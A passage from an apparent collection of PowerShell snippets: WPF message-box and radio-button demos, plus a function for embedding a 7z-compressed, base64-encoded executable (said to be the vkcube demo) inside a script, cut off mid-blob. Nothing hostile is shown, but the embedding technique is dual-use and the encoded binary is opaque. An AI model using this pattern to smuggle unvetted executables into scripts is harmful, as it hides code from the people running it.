iT6sgrSlGFZPf97z9wXbi9Ju/t0BU/+ML44pC2/zvrKLQVCshPQLjbDjHySR5IAcQF4K7kV84a/KCKCfplKN0AJ8aW8aEyee5QFqIpm0z25zZK+Sc4nduXF5
sEgKxVx1CF+7tPJlx8iLPGFfgTRhWEh0jjXq3DvcRUpSo9n4QShICgOsd1SiBdktAQXZ3OYuHtm80sk7U2/CPTDgEs2ox3uzCVag6zIBR4Fay27LcLq+QryF
H73DeOhpIWK6l24fUZcACS+VVAxKSQBlK5oJuYmkGxE+m1xz1F62Hhn0oPODSqi6gQY1xLwrlRL6LXn4Wj8C0a+6jsjucemSgc8RcRU9KoGclotat/RBsyl6
VsgNw9Dbu/U3TRml8IrpOUOwY3Nz/Mzg25RJ4inhzKgGqmSHDo42K3gUWpT9UOXPgsMNbhsUo2/xjesHziDfQ7oIln2YRBnmgn18wXEQpVjo8JFuw8zjpHWn
u5nMoKq6vHd2mtYk63JJY3sgBJaH4DIMz6TqkkwI7Uw7vAzUua7nRgQukvaNKAE7d0SxcCGJe2UQ4HdjexzybEg3mdoMHtMaGdvqKYdhixbcks88IFKaPwgk
1zSdK+eWEHdoG+v709zjHEUU+w2E8snJ0ITaGGB3Twjw/dy9q/oWbP1bmEw25dH59A186jxyhZnvv32KGWve9ETj9O4KKXa4z3bQYJPPT7zNE5GkdryHYc9f
6Jo1/v91VfKxhR8FMzn6OBNwA6THCbeZvXuAp936SHZUfGdTcdvFL8h9vJogDe/uhV0pviw9dAF5FfpynmEXLSQwg7RcoNoJfhDRIZXpxwlf73eipUWZApHr
aGH90OELf4KUgpFOgrCk38vKgpnTJRg1eV3MrhlHNjgNwuKfeuc3IFoDZKErlo1Ib1CIyUgC9ekYXvqmogPyV2Ku3gHCb4zJrZXEdoSzhk4nOtXBNRAiDTVJ
HigHirInj9GsUmF/sgB++zmpOQtb5wRozFdkfioiOe2nAbFifsheIEBGf7J+nZd1P3kzhhNTB4ngYn8UbeBWv+fuJmxeu6lu9T94NCcIsD9PObaMOIeQeD1M
qwvYXEEoMUYTPV3LrIcv/Pvl17BWZNo5MDtE3FZIGmU0pvub3dqqhTl6DL3g4epVfjNXEAw3B+pEqOZJQEIUfyqeYFpiGDALJiw8aTM0AvHPV3ia1ldNwnvt
CyzDgPSUtoIr3c4fi8AMVdVO1yisR9n8ZcV1gdOxfjm1BB8ymfHSo2xCeFBmciHkXUQfx5DvpWkHJ9QRfskmv7K06cR3g43Laeo7N06/VaSDg2DPSrljy9BA
SnctSH8vhJno6uBn5iuoKBWsKJmviX1Zk0uxhz8N6zPfjJE+Vsrd62mkKoWxUlgBLYauxDur5b7faLK2GzJFcD/Py0PFFE9LBxTGiQ6adHnbPkUQQbOUpIH2
1fh0Od1g7cSD5lmMQRDKZ6Y+1JcgVkvYsm/eIUMudjLdgeU3U5ftH07wV+AE1KKX4wYrD7Evgzpd/6Pwi4FZJZm33BIz3hCYYa6uQhuHGztN7UN3YhLrBgaA
fu10P7uhRYLnL7lOi47BkrbZ7WgDiGzl7ee8MnlfaFAwv442MrLILda5hHtwCILO6T7hvyWGauNi+ULztJuNZwO4bvQ3cHek3qDHiOKPZiLQJmJQjjXsTwBF
Y7qqifKCE2GgP6+ULNEEHlGluYtjNZe3/VbjNhBuVSyFHf/dvfnDjhKKVMRPDHTHlxw8COA4ipOiFF4Qi3YctqIukEwIRfAUaiqnhrJ+pYvhneLH+tRhDOxn
wXQV3vXFiFKP00Hijq+4iWZv1dM8NAYpDE8iAowtZKBaqJo9AiZSnN37qg1uEXWEpJffUVzMrNCL9FONfAI3lRhbpYXpHd67p+92zi0T1lZ1WsvTHwjVC3wM
bImYmRP8Y6fE2S8+h9dArrQT2GMdlBYHHbTanUreKYh/DdGovei57dbDpdSM6eKncTd5xVp6j2juEZEfGIYHxWvyBKf87GzPLgWKu2Lhh7OzFVJkBfqy3VEE
4lkxVwLLXvNSkb4+71jyYv6ZjdjtCqU5flUtTR7moFJEeLX5W+k7Vx8MGY57gMoQhCT5dT/D2zBrAl4qEYdUeVEs2jve6HRaI2Dk/ggb9RO9pNFE+rYFKzvW
YcRvIc9bsLHZbUyqOiV1qBwnhBPWn6WgtzOpfcg9csukISC6sfIjeM5Qv3Xi39YVRXX2e1SG7DQ5OVA8iyCxh1ltCkicI0r872Xd307Gk2X37D47yhVIhGKm
wOEQVRUrhIgYTFYXTxn9P8zlTLiSL134F3BVlnu3g0rEW8hPwlZQf2B8psnroEY5dQGPQ1uyT6b9dl7+hSAGWKPY1EUxzrAXlnzxKZqy3krl4USRWA9n3yqJ
lkOPBUhzD1becYORWC3u/+a3UYgCdQ3X/g0D/M0D3ewvWkVv1JqOeih5gbNWXNmmUmpXgpVaahxOqrHoigyBwMadPxeFWpVov7XJY0HKWNvBm0eNrD8uvjkn
+SJLwcQHaFgIxce1MydqCdUWGF+hwZZCFWzOxm3UYzzM6nmuOcOHc4jBB7yxaZzKY3i8lixOSGylYnUOoe3R8dRMFJYOfUdv0w7d/8JHCSClpH0WaUfrziu9
X/n8sKPiOUiq+hhxQzkFZacP0NpXT7Mz/xISKzo64e+rvpffTpWUdsKhaoXaxHBlNKgW0mFSteapEzzF41Q9Vzbi+1MJR4WbuP6ogBytDMAKXU6xiZosQ0fJ
YtglZJImrjB9UBD77oISLyW2DWVY8YmVfhLe9d0/s3AkiP8r/7+Uwwf07LOQq6Ex9zJ8PLv1k3BwFyP0C/gc45W6NnReY4xh1tOJouKRojQ/w/YfmvQIfKdT
/WgDdUdP/WBw3T/QtXyH3R1u0Y5CYWYJHHsIry00b8+7vPMDPPum+6hwSI9FYPpmk0bLthLaj5bgqMQvLDJK6Rti862uZDe3poEjKBKui321u0qLX4kyBg0Z
IyDMfETfq0L9Kbo7qrT13nZDoVDeMvi8civLJtZr5D+tckc9dqfg42LsKUX+Ab5UJUM+lNx7p27d/xj+uDM6TFEM8p0SM/ZClT/V1IVb1Z5/NBVfFnYd2BTF
gjbvpK8mB9aPYulUpnLmpKsgh679JfENtFYOb7KuT+WB/ze6Le7yfHrmuLK0d2U6ulNvkxIILLWRg9FtSm22cGOHLWxDfB8u1ObbNaIKK2VTj0ih+xlfBt0c
2bAnRoG7N0sXss0tHJ1gct9Ck+wYTn2N3uFPEa8Oi/52TLEqX8sJfB17LsE4HgV2IStxjg2BgCgvejzI+dlUaDYIo5iWATAC0rsWqzEh4iAsoKQs+n+HAVhZ
G+4/O8WSGuZkn0/uAOasN/49oHupppSVAcMw5ed+QkrKfSWyaO/LJhZm59Vgbcpy38SeXbaJYNebMiUs6tmCC69eTxjyynnfviUdU8iJ9bRtvD2g0aYIPkwU
ZiDiKnmBv8M59avaX/uqAIM8ci4WwTa86RHxogVsSr8IOZqi2R8v6H9DdNOd0nwJrukpucEpevfMoYqYzcb1GA8arB1TCJxZPu7MfGFStxRuFQq2HtevJvEu
iZ+QUtk9U+lrEeWifjkty7LHScz1QcLhzmFH/GG8QSQ8rMKwg9lNLPNZWF7akVM0U7h6ZQx0m+qg3wD+S8pDFW3+f6UFjMc7maBw+oSZiVLSzoXqq8ADNp9y
xOoHXJd4u7Q4bC8aYjbPyNDPH1X40Ihe01me9BeVmmk2MuYX3rpNTfWRf32IqdGzv5cBff93tpLwLdzE7b7kzqE0YnJ1Yy4IExk1Wx16X/5OhlMj6AK8PIUA
71bHoPnSS+URuFWJ1cJ7vTEJ67zQh0STZFmKN5qdHqJqqBwrcWTqIGOp3HWkm8Ud7N3SLWhLO4Nspo1Mv2ENmjsRqdUZH+vaE8Y73hc9lp7fO9RZCZtdcV1Z
gDwsrOeRG9+c9lZstNnWDG1z7INiKcwrHnwryOc2VqXQpdqKv2jo0ERtATdGggzSJlR9wJsvn7FwDOebpyGChIuJfEHcnCtJXwLnBGnx9L/jhYcjrK8exB4f
/pF8L7nSJC6K6fOVq1Xy1oVbcnxvtn3kVe81sKabAHQYSTukM8y3sVeWM7MbPcvZ/Yxk9u7Vn04TbVM20K6yGuIkl9Hla2j1r5Gn+jivnQNhGlDp/50Y6zRs
R6HFQi6f8YiDvt2ys28tSOimaicnmlEaj3AHTzP2KdOYOAUG9SEfvvswJ5t33+3paYuDtjFJu4z7cImqwzn9yyiRtbvTwkqY2J4WqEhmAdI3zFWbzjTZe3Aj
ZtYGC7NhuhbeCtiMAVeroadZWnmDh8uI/kjcOcYIUnBkMa8xOk3KdEPR0axf9t3+CoG0x8Mbnd3x3XyfS9nrnlmgiE1O2cBC6dAmikv01r2UX92Ctq4pq/JX
tzaz9MVO7h6uOY0It7BcJZHB7ZjcZaR6I+WBbIoQAg0raKrXIPO/gO9VgCCurUTvpQiVQENg7+Ij1wh6WgzbrJ0QQzGX5cH3ZH0ZYHo/Yw0TobicLj2Lw/mo
hudPAXPa3EzQGVQODz+fulZWLV93INYAjxj4fNNoZFZArNnuv2J8u5+mJkIabLiXnEwgp1PBuYlCJOeSQkE4OTTGLYcDzZHGF2TRdZOaM2IWf0/wqJtafDHI
SXN/JorDNMWamufq9T1VpCJdPtVC0+K3T19m9BwGs4KIV+wp17oCobQUY+t4DJhq2oqaCPQkGnQGuSXvM629pZvsbiAXT0iUxlIJ6skwCLlzb2XKDEhbKCS8
9Nz3bEWFr+H4deaHwualmyVfS6jfxlPH5Nw9DiH2armEtCsjZfVDvycdz7RE3wbKv2c5jOXqV5j0tMOcFlNzP2VbDdUPD9W4dZ8A280zQAYRsWZyAKGpA9Cs
V9SW4RXlMMFW2YrGEj9THQ6j4XomltEQyHS04n3WEKjR2NyyQF08KJMux0HQKvZUA8nexVuGC45RvDUCPGI2jbR14t3ul99mPC80+lZ4hQ3rAMYjb0Gv1jSM
fdDXSfrEtDkk4SOQTkeVO93jhccHM3hhI+qSXtFSvK69mxfrZQMQUQUFe0bR0n6xzVwEijk6s74suOm9E8SB3zocbAxwRguoct6a/y1o2XP6UcGqSuTsLmGW
rzZjpC71cu/LD2sFACsIiKpyeYPpY8WQStfvm1WyaSl6IfFOCuJquW0znvE1T4qrey4Z5okLHeGKOw3riODvqwqgQLcTCBmqXfe/yOaHYhhodNL9E+4zHsON
duy1HlQb0ZH41wKWj4q85hfctItQyjpoKO8RAn487iKLEwhzcWVF+rUvtjMh9MspVUT3xnkEkV0uY2XbQl1Eieq9XAui4MFm6QonTCiWvxR64V8f9UrGFIUW
rYEpCgU9gA3J3XdMWS80cI9vpucIByi/AjQqRe0z6K13ZnwpQNPrKFZ5/JT/tGW/EUlCzpR0p8MKIhnf7w8pUjbycCvhaU6gMRjKTMpx9RBI2BqCoZZZc3bU
YMjDgXlKg00UvjQmar0Z0D7RcPQNA1hAnP56HZTWl8MUfAwBun9/eAiRIaISkKezuxKx0iVCZ183HbfS8r6OYcyMibhGKGuZ9DE+eKEQGFYgt6/czHiyPCML
NsAlgPW+4nSAe//iRghYJEUT8AJ3VZ4gVEcrWYVe8mDN9YmOXFytyg3kgCwYbsr5MduVsYitKGpv/i7Kt26Lwxmvmjy2FTIOxMP/vIMqVGp1jCPPhPTP60Wc
DAlIbfYBF+z+dx6oACpNVU9HNfZIQj0vkcQUFcf9c5Dt3QyZdpH3PO6HANbUMVOCeLjzOBKAc2PEBLfYquFiK33vDJuC3LZJ7h0lq+bbrDY6OPvrPIvW5Krb
rlKV6fzdl4orkyb8ZLsSVG983GaZg7cHX7AYwTwXhQlxF2Di+TPn9UZ9KhIocrnKjjHlAnEMTIUYDET1th1TWgDdiAVmylKfmIgbXhDHsDIkzT5rVFQ8MMkc
CzuuIfl7was0P07S92JWm6A+4T3XgRVZ/p01D+o14Bd0EUfalumFje4RYLPpEybWmqmTpRHy+GixXpi9PlGB1RMzECXmU0LmOxmdmYAQYYTt1E1BaHhS6Y/T
VY6j5HmrvW/nGEXu7AgRI7SjusLRvjNf573R2r8JwbNYTyJU4sZYvjpJ7AMKNYyk7/SQ3tKy2oNOsmaNys/ZNLhsqgwthdC2iqzFO1lW4xBGJ2H39LMzLQce
cQKn73wM2LpX8jRlZUFLfZ1v4l85xafhB8HraJuuVSwnHMV/cmO7fgtsZn5J9NHfWJUMbd7USfqYUDWJ8FCKBNObXh2ByfbIfOiHW+vLfyCVREaCOFtSdJpH
v4jcVYs3k5WmZvawS7cnC5GL8DQbbPlfIQqvAwEKzIahQ8XvI5wpY74w4rjhtr1zYAdId/TxRc857Wa0Kv98eEYQA7WIb7AWFuy+3vNEDm9OixO+9qq8zFUW
9SsJKtFLjTKAU6xuEAzK+mo4qCwqR1GsFtA/b58GCzCFLYQFBLVWAa5SfmxfGLV+U51T2PqiLbo0Xp1IfxkpBHSo3Qx48UlKI1OrmZ1FnkgLNhMhHWa6Cqxe
/4jqJqn3+ef/8J8+3kCrG36PXAW/bfSKNjdsqNmZ+mkH6lQU2Zy2ZGEdoothBNRJqyVFm/CWXuA+tVn2jB1CCXX8DpdK1wb03mszFQmzHSADx4oZUsC6A1JW
7F1WjFCfsSccY1E6T/IZevhURfi0q90EuXihBQFGzj8uYDJ6E4mCTJkQ2yJbIh9Mrr1g4Ldz0+6xozU6T/bB9NofsKYvqCXea7dzbhRgtqc9ucvUc+5nO5YL
urqNny4hMFDYQVe3qx1+ryYmyei49Iy9ZYlizf1QgjBJ8P2CnbvsUCgAivfsf6jyAOPipQFAAwsPd4FttNOYb3Js2TnwFxwx82rrBkjd/CeyxSRq131ILXPf
YxGD+zM7TLQ52CVPMYM27tS4tiCj6VA2g2n2hKnzKzH9TPoiA69T3Wx0ZQXCyHJzAwT6k2zq8c7k04+yXaSt9xfYCu2shccwnoEDq6aagnKuBghgQ9GNRqov
9jwXZpOzcPo/s6OuSegMwuC3c7lWvMIlTdtJhOUJnLULbf5e3XH1UDgFKeWld69syzdaLtsY3lwv7lJ+9VYHX2RiK4Euszz9bF7qSXmGliDh75jNTJtV5mr6
6e8yeXtMfROwCVMAAQQGAAEJogYABwsBAAEjAwEBBV0AgAEADMHeFwAICgFsTIjcAAAFARkDAAAAEQ0AYQAuAGkAYwBvAAAAFAoBAAqeLVRtLdkBFQYBACAA
AAAAAA==
'
Add-Type -path $env:systemroot\system32\WindowsPowerShell\v1.0\SevenZipExtractor.dll

$result = [System.Convert]::FromBase64String($Base64)
$zipStream = [System.IO.MemoryStream]::new(($result))
$szExtractor = New-Object -TypeName SevenZipExtractor.ArchiveFile -ArgumentList @($zipStream, 'sevenzip')

foreach ($entry in $szExtractor.Entries) {
    $memStream = [System.IO.MemoryStream]::new()
    $entry.Extract($memStream);
    $CustomImage = New-Object System.Windows.Media.Imaging.BitmapImage
    $CustomImage.BeginInit()
    $CustomImage.StreamSource=  $memstream 
}

$CustomImage.EndInit()

$Image = New-Object System.Windows.Controls.Image
$Image.Source = $CustomImage
$Image.Height = 512 #[System.Drawing.Image]::FromFile($CustomImage).Height / 2
$Image.Width = 512 #[System.Drawing.Image]::FromFile($CustomImage).Width / 2
 
$TextBlock = New-Object System.Windows.Controls.TextBlock
$TextBlock.Text = "My Logo"
$TextBlock.FontSize = "28"
$TextBlock.HorizontalAlignment = "Center"
 
$StackPanel = New-Object System.Windows.Controls.StackPanel
$StackPanel.AddChild($Image)
$StackPanel.AddChild($TextBlock)
 
New-WPFMessageBox -Content $StackPanel -Title "Messagebox with some logo" -TitleBackground LightSeaGreen -TitleTextForeground Black -ContentBackground LightSeaGreen

$ComputerName = "RandomPC"
Try
{
    New-PSSession -ComputerName $ComputerName -ErrorAction Stop
}
Catch
{
 
    # Create a text box
    $TextBox = New-Object System.Windows.Controls.TextBox
    $TextBox.Text = "Could not create a remote session to '$ComputerName'!"
    $TextBox.Padding = 5
    $TextBox.Margin = 5
    $TextBox.BorderThickness = 0
    $TextBox.FontSize = 16
    $TextBox.Width = "NaN"
    $TextBox.IsReadOnly = $True
 
    # Create an exander
    $Expander = New-Object System.Windows.Controls.Expander
    $Expander.Header = "Error details"
    $Expander.FontSize = 14
    $Expander.Padding = 5
    $Expander.Margin = "5,5,5,0"
 
    # Bind the expander width to the text box width, so the message box width does not change when expanded
    $Binding = New-Object System.Windows.Data.Binding
    $Binding.Path = [System.Windows.Controls.TextBox]::ActualWidthProperty
    $Binding.Mode = [System.Windows.Data.BindingMode]::OneWay
    $Binding.Source = $TextBox
    [void]$Expander.SetBinding([System.Windows.Controls.Expander]::WidthProperty,$Binding)
 
    # Create a textbox for the expander
    $ExpanderTextBox = New-Object System.Windows.Controls.TextBox
    $ExpanderTextBox.Text = "$_"
    $ExpanderTextBox.Padding = 5
    $ExpanderTextBox.BorderThickness = 0
    $ExpanderTextBox.FontSize = 16
    $ExpanderTextBox.TextWrapping = "Wrap"
    $ExpanderTextBox.IsReadOnly = $True
    $Expander.Content = $ExpanderTextBox
 
    # Assemble controls into a stackpanel
    $StackPanel = New-Object System.Windows.Controls.StackPanel
    $StackPanel.AddChild($TextBox)
    $StackPanel.AddChild($Expander)
 
    # Using no rounded corners as they do not stay true when the window resizes
    New-WPFMessageBox -Content $StackPanel -Title "PSSession Error" -TitleBackground Red -TitleFontSize 20 <# -Sound 'Windows Unlock' #> -CornerRadius 0



$Params = @{
    FontFamily = 'Arial'
    Title = ":("
    TitleFontSize = 80
    TitleTextForeground = 'White'
    TitleBackground = 'SteelBlue'
    ButtonType = 'OK'
    ContentFontSize = 16
    ContentTextForeground = 'White'
    ContentBackground = 'SteelBlue'
    ButtonTextForeground = 'White'
    BorderThickness = 0
}
New-WPFMessageBox @Params -Content "The script ran into a problem that it couldn't handle, and now it needs to exit. 
 
0x80050002

 See https://smsagent.wordpress.com/2017/08/24/a-customisable-wpf-messagebox-for-powershell/ for more exmaples"


}
}

function func_wpf_routedevents2
{
#https://learn-powershell.net/2014/08/10/powershell-and-wpf-radio-button/

#https://gist.githubusercontent.com/SMSAgentSoftware/8331a70fac978e4c998bbc8fe34094bb/raw/88c2e4e7850cfd5177f76751f9b13cfc21db840e/New-CustomToastNotification.ps1

#Build the GUI
[xml]$xaml = @"
<Window 
    xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
    xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
    x:Name="Window" Title="Initial Window" WindowStartupLocation = "CenterScreen"
    SizeToContent = "WidthAndHeight" ShowInTaskbar = "True" Background = "red"> 
    <StackPanel x:Name='StackPanel'> 
        <RadioButton x:Name="Item1" Content = 'Item1'/>
        <RadioButton x:Name="Item2" Content = 'Item2'/>
        <RadioButton x:Name="Item3" Content = 'Item3'/>  
        <Separator/>
        <TextBox x:Name='textbox'/>      
    </StackPanel>
</Window>
"@
 
$reader=(New-Object System.Xml.XmlNodeReader $xaml)
$Window=[Windows.Markup.XamlReader]::Load( $reader )

$xaml.SelectNodes("//*[@*[contains(translate(name(.),'n','N'),'Name')]]") | ForEach {
    Set-Variable -Name ($_.Name) -Value $Window.FindName($_.Name) -Scope Script
}

#Bubble up event handler
[System.Windows.RoutedEventHandler]$Script:CheckedEventHandler = {
    $TextBox.Text = $_.source.name
}
$StackPanel.AddHandler([System.Windows.Controls.RadioButton]::CheckedEvent, $CheckedEventHandler)

$Window.Showdialog() | Out-Null
}

function func_embed-exe-in-psscript2
{
#https://truesecdev.wordpress.com/2016/03/15/embedding-exe-files-into-powershell-scripts/

#Adapted a few lines so that it runs in PowerShell Core, search for lines that start with comment "ADAPTED TO PS7"

#Only works for 64-bit executables as only 64-bit pwsh.exe is installed....

#usage: wine powershell -f embedding-exe-files-into-powershell-scripts-example_vkcube.exe.ps1



function Convert-BinaryToString {
 
   [CmdletBinding()] param (
 
      [string] $FilePath
 
   )
 
   try {
 
      $ByteArray = [System.IO.File]::ReadAllBytes($FilePath);
 
   }
 
   catch {
 
      throw "Failed to read file. Ensure that you have permission to the file, and that the file path is correct.";
 
   }
 
   if ($ByteArray) {
 
      $Base64String = [System.Convert]::ToBase64String($ByteArray);
 
   }
 
   else {
 
      throw '$ByteArray is $null.';
 
   }
 
   Write-Output -InputObject $Base64String;
 
}
 # Below vkcube.exe as a Base64 encoded string; Included copyright below:
 # compiled for smaller size (after choco install mingw and choco install vulkan-sdk) with gcc -s -Os -fno-ident -fno-stack-protector -fomit-frame-pointer -fno-unwind-tables -fno-asynchronous-unwind-tables -falign-functions=1  -mpreferred-stack-boundary=4 -falign-jumps=1 -falign-loops=1 -I"..\Include"  .\cube.c "..\Lib\vulkan-1.lib" -lgdi32
 # and added two extra lines to cube.c : #define VK_USE_PLATFORM_WIN32_KHR and #define NDEBUG
 # Copyright (c) 2015-2019 The Khronos Group Inc.
 # Copyright (c) 2015-2019 Valve Corporation
 # Copyright (c) 2015-2019 LunarG, Inc.
 #
 # Licensed under the Apache License, Version 2.0 (the "License");
 # you may not use this file except in compliance with the License.
 # You may obtain a copy of the License at
 #
 #     http://www.apache.org/licenses/LICENSE-2.0
 #
 # Unless required by applicable law or agreed to in writing, software
 # distributed under the License is distributed on an "AS IS" BASIS,
 # WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 # See the License for the specific language governing permissions and
 # limitations under the License.
 #
 # Author: Jeremy Hayes <jeremy@lunarg.com>
 # Author: Charles Giessen <charles@lunarg.com>


#Compress Base64-string:

#$InputString='any uncompressed base64 string...'

#Compress Base64-string:

#$MemoryStream = [System.IO.MemoryStream]::new()
#$Compressor = [System.IO.Compression.GZipStream]::new($MemoryStream,[System.IO.Compression.CompressionMode]::Compress,3)
#$CompressionWriter = [System.IO.StreamWriter]::new($Compressor)
#$CompressionWriter.Write($InputString)
#$CompressionWriter.Close()

#[System.Convert]::ToBase64String($MemoryStream.ToArray())

# format later with unix fold for nicer output (120 char. width)

#this is a vkcube.exe file regulary compressed with 7z on commandline
$CompressedString ='
N3q8ryccAATghidcwscAAAAAAACqAAAAAAAAANw2DDgAJpaOcAAX9+wFu+r0/5QBL0TvfOb1CRlEAin/U83W0RT+nmGcghX2CXqsa7TtVBCeJspxz8VHK8jr
IkX+QfqzWY9yBAmAbzpsXsVUBdyoJxEKXJ+PUbm89vN3xALLmzlA2jyc1+oEyiw9NRDw4fvU7uiZoRTozjOkzeTslbHEoaLAbCP0WL3KAYN4X4B5BY4fADoi
tZljlYpgmrYASLyWitPkZF7dFbuNO8D8yreVecuiSHasGgb4jN38eyWTXBq3nepccVUsRmBuaalsdzEi4tD1TzjAWyRmRxEk3814rViiLAb7jKkCr9xIpBGJ
EKe1HWLxclXajqnj3th2uAUjC8KEYLP4j0VJgs4rDXvmw4JqS6fKBA88zfU2zgHFHDVIpP9l/rArBNX+jQQqHyQGgwGpIlDJTiijfhD6k+apH1J5DQ4k0x60
Ol23YLutFe8rGAkYRyZmVsA/FHuRl7I6FW6t3BmCw5O0BQ2hTH5dGFLdI9/rPUaIcvqpY374fAindXEp+Q5OvH9MApFpaNKU8zGX4zFscIZ5iSXmmjXkFnz1
1Ohh8KlQVVMOJorPjtPEpn6izlC7eyklusll4pFOUtF1rgpn35ae1cwVtLo1iSulrT4ciVd5yW2xNej0r6VlnV4cBEjXWCAmvMmYNQKCXagobmZWafPwc4h2
0FZl/MF6uTNcMAphfJZLnpzH2vLE+6jXjZTWtsLUBZYQGMN8yFS2ka/EJGq+WuuPpfBVp4EAnRvtaNm3RMUyJqf532jYXSAL0p5abW1YhcMIsktraQCVya+V
X4DUp8sLDcB6B8aaDZB1AkEpgLiYVUCEIwaXMHJAI4rpnn5ys/j56h6eP+hPKKnbvpJk9qaTE4LshdPeWC/5GQfNwdNwT9brmG6WV9FlN/LA110xn8C5Nntv
nEE5QIJCP266XHRiKkLpXv5UbZCJYOLKCjFSCZaLfNxxQWBHO0nS0JL3iiq7yeaf/Q029GvrehVAqAPqRgiv0ZO/HayrBkEpcx4Gy84/kyxEgc0YzED2wr40
te4GI4GQI6Trq4ZlLIdQJ6HJOyJpgVuZjv0/CAEZGD3UU9JQXVw3QsUBpcimn9c3rKnmZWXh1DI1mwKjwOXmc04pmTfdlDoCQ5/c52sTDDold7K8HLYSjhRU
aMVjPnfNWP3ead6YsI8Rj2nUCLImxOo3V+Eqr5w1wvyYhD8XdL3gkglihu6cfWRXOr8pXL9++VB2SOHYDMdh0MVYAJ5fwZQTyy9VLASh4i/KSe03HH4SuqRG
/O5O4L3ZC7QkvIsLqgsGHB+nEZBFiI/oAfikDE10YoOkDSgFti5wtD0zSqwdW+wWHspN8JepoS+7jsyCDVfzOZN5oKTPy7TTcsv10w0otmUvBPuXiTXbzd5s
YERzjX89EcDr+gqfQcdcS4mt5zWneJteNi3Y8CC1QQ23kDfNouGWnnyfHWg0gBoeBVA7qUXfPTah/jm1zydIZQhZzdlYYYEFVfPkxxN5J7toSnQD9XumMuMG
NhxUXkUp/GnSOEIVvhWvgsmLRehviHZZr5rq+9JM8fehD8vc4LbYMtOlOsIx2JJuqJN01TZ/yvcgOVsZ/vimlVF+hlVf47hAZu4nXNapYTbnWk/BUuOWreng
9fkwzlqNoLoGqkRMaMwgw69Jaz1XHpxK0PH3Q2SlEz11Vqd/L3ZKE/syTfpZypnpxP2LgfuqC+BBVL3ZItmT2epfirFl4nwKWPkyGdbBPT7Wuk//KrypgRTw
zmSxJyC7GHeA43Wv37mfmQJ1VLUzuTbFDTTBz2DG7GrXrmTGZlHwKNK26e0QRRfA8VJJSomLIbH7y3m9/+VhwGSmopq2Zd3rZ5qkezTa7v1IVzw9n0GIvXvJ
PGkkzyEn/EOBvr45W30YYQOTvjIhswBNg2JfYf7ywaVUh5ceIsG5Y2QRENT3RQApDw1AxEx+kd+TD2GIWZ6oKyk5yyPztcIi4n7dpVfBer9CJRW+dwrcNJNN
VeCB4jB1QQszk5nzh86CMpLajJxNvlSWhcxOhmxYBQq4xc5VJwMbjhM+YRdsNYm29fQsrW2/usjmO0PFZCDhXt06NdAjeQftmrYWg4vV8sQDQ8WbHFjjykW+
R1XdMHEwSF9zdU3Z0kVIUXDZnI6yU+yF8HjGOB28jT/eec61PBehHBnkv8Wpxl/bhggCHbuv77DVI7zSj17L5OuLgoU7TEeStcGwMMdSa0dBMlcm3Sx9xML1
1vsGqAPrZ86BgNZYKXEQTH4l8yr4P81KwNSLTxSuW9KwNuO/if6iWWOHOdEA9S2gre4Mbfe8Od2tRBJaHv+BP33ZC2n/IGBWGUh9zkY0ouJwy62nSWj9KAgT
M/5Qd41Z7LPzoE2bPuKt4vqjjOd4LdnTkqTf/3fYTl2Gea6yPnFeg/Fh+9No7dWB8dyuHUlIzXYEshwy0D76ceY5kHDZi9msW5vcvmnKkAUq2Lrvbs74aq2C
SJYJ2PXwwlHoJbY/Qlf/REva98xkbP9w955rcI1eXl1y+Pex2NRmjVuwdB53wXsbWA+Jt633bfedAEAv12LctC5MbxPRu19bmgAA9YdgTvsNw+BSmYZfOiBb
12TMfBmo5UrDkJOwjpMcrsTAyIVCOdWFfLFaeqtHYTN7IZfQsguk3EyW4YfhHLEZCrKLS1ZZXQn7jdBd7pw6Z6vLKrO0ES+plVi7z0S2kQLJansgIXCN+8uV
lCqy4pZrhU8Tmoca4MdAFikp2aJwEohex1B5TCRK8bI6jKS3hSV9fxDsbPGPPBpoteundFWZAfhlK4IQDL/lu3tAK2UOuFNBzEk42fKayTg+IDC/mBZqcw6Q
SSq3TPkzFbujtHn0oKXCE0iAgHfKhCqgfRntUGrxanWUbxl15EwJgQHQajTmZprbphF6dQ++PPoxBDLhysjn8oNQ3GuRp8kUZ836KYwn0qo9cYxk0cD7/Idt
asomxY1jQpFk8w6hopG8+3iKOg+RsXK2vgtvKfGVxUIz/Jsplcedq9Bm2NYWhI2OsR9UubB/qOJQ1l+eALXdD8A+LzVZeZtt6DQYkhGcOFv19sOt/BM2LrOu
Yx7GAT4YcO+cy+FBwiFAjnBNyfWXzxlJwkMYbn1YGfNIa2JCXUG+mLIxhkjwkqyNOIHo/HLXVr+qB/2+Jq4nGM8oyBLQIOWRpnrOuE4XldJiOkAI7RnFuSJ3
rwOtAQH99UrQgdwaocyqG2Bmug1f4sb+BTZbYqmRwp3B8dYO11conWGvoaXKYeqC233gZYYPF8Noh2Emq8Zk5ggbW2szASWp8TRR+MC9DtiS93SlB0v/zveI
Hnr412vS2nr6RssKrwA32rI2Lsox/W0aZFDQh85XP5iOxopfmbMUe1knHC85e7npbPcFrf4VvTeI2afDIpTrq1ftZ07YRvSlxkiItVyUAckYRL9I3dAn3TC9
qd8pW11V0kEICbUCV6z32V+5xzUsNKoxvy4GQAKIYRoibFu3LrJK0fMlUISgyH2tTLFv2TsVJp6/4vaJmRTwCROi/xdg0rjdkY0//N93lTNN2k1GV6pIEJ7g
PANLecclYiGb5DiODha5uHVJabzWvnuCu/jQbq7nO1pEzqTTASb67t0U9ZNgqN8Dn3b7Pdlfa+DMQeicEfl+wT+BDHGWYAYpzmkCmpotJQ+04BAMsLDEVODb
Bldsr3AxNu/mFeIZiz5Lzd+jhvZKACCENRLwZC/KBBgin4hlNKc7F6WlwHId0EQRedklTE49Pxx7R8Vjak9NL5RWFM0evY84LDCfzkuylFuRrtV0ss9M+bVh
BG1YY196LshQ93i7Fd5fCOWRxPDTIlgldK0/FW/L9K5TtGReDYnVfJDr2oG/h4IW8In6qbuaPkIWiGi5e96OFZ3sOxrL1ObNP25nuGrHQvXCmWSCyukq1aOu
O0WGgDUmgGfkoyqZlBaTMuCaq2XBF1LBkOBCmBz4Yy8icMaXRmT4GlWjLTdDxvyCfaz4onnWtY+sMv7wsL46c+lJ9xYLvbh29ifxYEn38b0N0NBzTUz13fVF
/xFdfCi0vG7/vQiXVxUBiJMs2xJ8wks+bEfOA7W+pvmrJlCrd65cNRLHoGJ9CFznTsJyaW3G8SVXVZXNEqaQIf0XIPUcFL31HWnw1mTyst40mF0dupjitDHM
